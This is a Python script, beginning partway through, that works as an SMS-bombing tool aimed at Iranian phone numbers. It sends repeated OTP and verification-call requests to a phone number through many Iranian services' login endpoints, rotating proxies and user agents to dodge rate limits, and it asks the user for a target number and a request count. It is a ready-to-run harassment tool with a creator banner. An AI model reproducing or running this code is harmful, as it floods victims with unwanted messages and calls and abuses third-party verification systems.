    }
    try:
        response = post(a, data=b, headers=d, timeout=2)
        return response.status_code == 200
    except:
        return False

def therty(phone):
    a = "http://servermv1.xyz/api/v1/reqSMS"
    b = f"phone={phone}&"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)",
        "Host": "servermv1.xyz",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "Content-Length": "18"
    }
    try:
        response = post(a, data=b, headers=d, timeout=2)
        return response.status_code == 200
    except:
        return False

def forty(phone):
    a = "https://core.otaghak.com/odata/Otaghak/Users/ReadyForLogin"
    b = {"userName": phone}
    d = {
        "Host": "core.otaghak.com",
        "app-version": "235",
        "app-version-name": "5.12.0",
        "app-client": "guest",
        "device-model": "POCO M2007J20CG",
        "device-sdk": "29",
        "user-agent": "app:5.12.0(235)@POCO M2007J20CG",
        "content-type": "application/json; charset=UTF-8",
        "content-length": "26",
        "accept-encoding": "gzip"
    }
    try:
        response = post(a, json=b, headers=d, timeout=2)
        return response.status_code == 200
    except:
        return False

def fifty(phone):
    a = "https://gharar.ir/api/v1/users/"
    b = {"phone": phone}
    d = {
        "Host": "gharar.ir",
        "appversion": "1.5.4",
        "content-type": "application/json; charset=UTF-8",
        "content-length": "23",
        "accept-encoding": "gzip",
        "user-agent": "okhttp/4.9.2"
    }
    try:
        response = post(a, json=b, headers=d, timeout=2)
        return response.status_code == 200
    except:
        return False

def sixty(phone):
    a = "http://serverhv1.xyz/api/v1.1/reqSMS.php"
    b = f"phone={phone}&"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)",
        "Host": "serverhv1.xyz",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "Content-Length": "18"
    }
    try:
        response = post(a, data=b, headers=d, timeout=2)
        return response.status_code == 200
    except:
        return False

def sventtubf(phone):
    headers = {
        "Host": "cyclops.drnext.ir",
        "accept-language": "fa",
        "accept": "application/json, text/plain, */*",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
        "origin": "https://panel.drnext.ir",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://panel.drnext.ir/",
        "accept-encoding": "gzip, deflate, br"
    }
    try:
        get_response = get(f"https://cyclops.drnext.ir/v1/doctors/auth/check-doctor-exists-by-mobile?mobile={phone}", headers=headers, timeout=2)
        options_response1 = options("https://cyclops.drnext.ir/v1/doctors/auth/send-verification-token", headers={**headers, "access-control-request-method": "POST", "access-control-request-headers": "content-type"}, timeout=2)
        post_response1 = post("https://cyclops.drnext.ir/v1/doctors/auth/send-verification-token", json={"mobile": phone}, headers={**headers, "content-type": "application/json;charset=UTF-8", "content-length": "24"}, timeout=2)
        options_response2 = options("https://cyclops.drnext.ir/v1/doctors/auth/call-verification-token", headers={**headers, "access-control-request-method": "POST", "access-control-request-headers": "content-type"}, timeout=2)
        post_response2 = post("https://cyclops.drnext.ir/v1/doctors/auth/call-verification-token", json={"mobile": phone}, headers={**headers, "content-type": "application/json;charset=UTF-8", "content-length": "24"}, timeout=2)
        return all(response.status_code == 200 for response in [get_response, options_response1, post_response1, options_response2, post_response2])
    except:
        return False

def is_phone(phone: str):
    phone = sub(r"\s+", "", phone.strip())
    if match(r"^\+989[0-9]{9}$", phone):
        return phone
    elif match(r"^989[0-9]{9}$", phone):
        return f"+{phone}"
    elif match(r"^09[0-9]{9}$", phone):
        return f"+98{phone[1:]}"
    elif match(r"^9[0-9]{9}$", phone):
        return f"+98{phone}"
    else:
        return False

def print_low(text):
    for char in text:
        print(char, end='', flush=True)
        sleep(0.001)

# ================ تابع اصلی ارسال با پروکسی ================
def send_requests_with_proxy(phone, count):
    """ارسال درخواست‌ها با استفاده از پروکسی و User-Agent"""
    
    # راه‌اندازی مدیریت‌کننده‌ها
    proxy_manager = ProxyManager()
    ua_manager = UserAgentManager()
    
    # دریافت اولیه پروکسی‌ها
    print(f'{y}[*] Initializing proxy manager...{w}')
    proxy_manager.update_proxies()
    
    # آماده‌سازی لیست درخواست‌ها
    all_requests = []
    for i in range(count):
        for func in functions:
            all_requests.append((func, phone))
    
    # آمار
    results = {
        'success': 0,
        'failed': 0,
        'total': 0,
        'lock': threading.Lock()
    }
    
    # متغیرهای زمان‌بندی
    start_time = time()
    requests_per_second = 4  # هدف: 4 درخواست در ثانیه
    
    print(f'{g}[+] Starting {len(all_requests)} requests with proxy rotation...{w}')
    print(f'{y}[*] Target speed: ~{requests_per_second * 2} requests per second{w}\n')
    
    # ارسال درخواست‌ها با کنترل سرعت
    with ThreadPoolExecutor(max_workers=requests_per_second * 3) as executor:
        futures = []
        
        for i, (func, phone_num) in enumerate(all_requests):
            # کنترل نرخ ارسال
            elapsed = time() - start_time
            expected_requests = i * requests_per_second
            if i > 0 and elapsed < i / requests_per_second:
                sleep_time = (i / requests_per_second) - elapsed
                if sleep_time > 0:
                    sleep(min(sleep_time, 0.25))  # حداکثر 0.25 ثانیه تاخیر
            
            # ارسال درخواست
            future = executor.submit(
                send_request_with_proxy,
                func, phone_num,
                proxy_manager, ua_manager,
                results
            )
            futures.append(future)
            
            # نمایش پیشرفت هر 10 درخواست
            if (i + 1) % 10 == 0:
                elapsed_time = time() - start_time
                speed = (i + 1) / elapsed_time if elapsed_time > 0 else 0
                print(f'{y}[Progress] {i + 1}/{len(all_requests)} requests | '
                      f'Speed: {speed:.1f} req/s | '
                      f'Success: {results["success"]} | '
                      f'Failed: {results["failed"]}{w}')
        
        # منتظر ماندن برای اتمام همه درخواست‌ها
        for i, future in enumerate(as_completed(futures)):
            future.result()  # فقط برای گرفتن استثناها
    
    # نمایش نتایج نهایی
    elapsed_time = time() - start_time
    avg_speed = len(all_requests) / elapsed_time if elapsed_time > 0 else 0
    
    print(f'\n{g}{"="*50}{w}')
    print(f'{g}[+] Operation completed!{w}')
    print(f'{w}[*] Total time: {elapsed_time:.2f} seconds')
    print(f'{w}[*] Average speed: {avg_speed:.1f} requests/second')
    print(f'{g}[*] Successful requests: {results["success"]}')
    print(f'{r}[*] Failed requests: {results["failed"]}')
    print(f'{y}[*] Success rate: {(results["success"]/len(all_requests)*100):.1f}%{w}')
    print(f'{g}{"="*50}{w}')

# لیست توابع برای ارسال درخواست‌ها
functions = [smarket, snap, torob, tap30, okorosh, divar, gap, one, two, tree, fwor, five, six, seven, eyit, niyne, ten, eleven, tovelf, therty, forty, fifty, sixty, sventtubf, classino, alibaba, tetherland, jabama, mobit]

# رنگ‌ها
r = '\033[1;31m'
g = '\033[32;1m'
y = '\033[1;33m'
w = '\033[1;37m'

# نمایش لوگو
print_low(f"""
{y}⣀⣀⣀⣀⡀⢀⢀⢀⢀⣀⡀⢀⢀⢀⣀⣀⣀⣀⢀⢀⢀⣀⣀⣀⢀⢀⢀⢀⣀⣀
{g}⣿⡏⠉⠙⣿⡆⢀⢀⣼⣿⣧⢀⢀⢸⣿⠉⠉⢻⣧⢀⣾⡏⠉⠹⠿⢀⢀⢠⣿⣿⡄
{w}⣿⣧⣤⣴⡿⠃⢀⣰⡿⢀⢿⣆⢀⢸⣿⣤⣴⡾⠋⢀⠙⠻⢷⣶⣄⢀⢀⣾⠇⠸⣿⡀
{r}⣿⡇⢀⢀⢀⢀⢠⣿⠛⠛⠛⣿⡄⢸⣿⢀⠘⣿⡄⢀⣶⣆⣀⣨⣿⠂⣼⡟⠛⠛⢻⣧
{y}⠉⠁⢀⢀⢀⢀⠈⠉⢀⢀⢀⠉⠁⠈⠉⢀⢀⠈⠉⢀⢀⠉⠉⠉⠁⢀⠉⠁⢀⢀⠈⠉⠁


{w}𝐆𝐄𝐍𝐄𝐑A𝐓𝐄𝐃 𝐁𝐘 : @𝐏𝐀𝐑𝐒𝐀_𝐆𝐓𝐈𝟔
{w}🌟 Proxy-Enabled Version 🌟
""")

# دریافت ورودی شماره تلفن
while True:
    phone = is_phone(input(f'{g}[?] {w}Enter Phone Number {g}(+98) {r}- {w}'))
    if phone:
        break
    print(f"{r}Invalid Phone Number!")

# دریافت تعداد درخواست‌ها
while True:
    try:
        tedad = int(input(f'{r}[?] {g}Enter Number of Requests : '))
        if tedad > 0:
            break
        print(f"{r}Number of requests must be greater than 0!")
    except ValueError:
        print(f"{r}Invalid Input! Please enter a number.")

# اجرای برنامه با پروکسی
try:
    send_requests_with_proxy(phone, tedad)
except KeyboardInterrupt:
    print(f'\n{r}[-] User Exited')
except Exception as e:
    print(f'\n{r}[-] Error: {e}')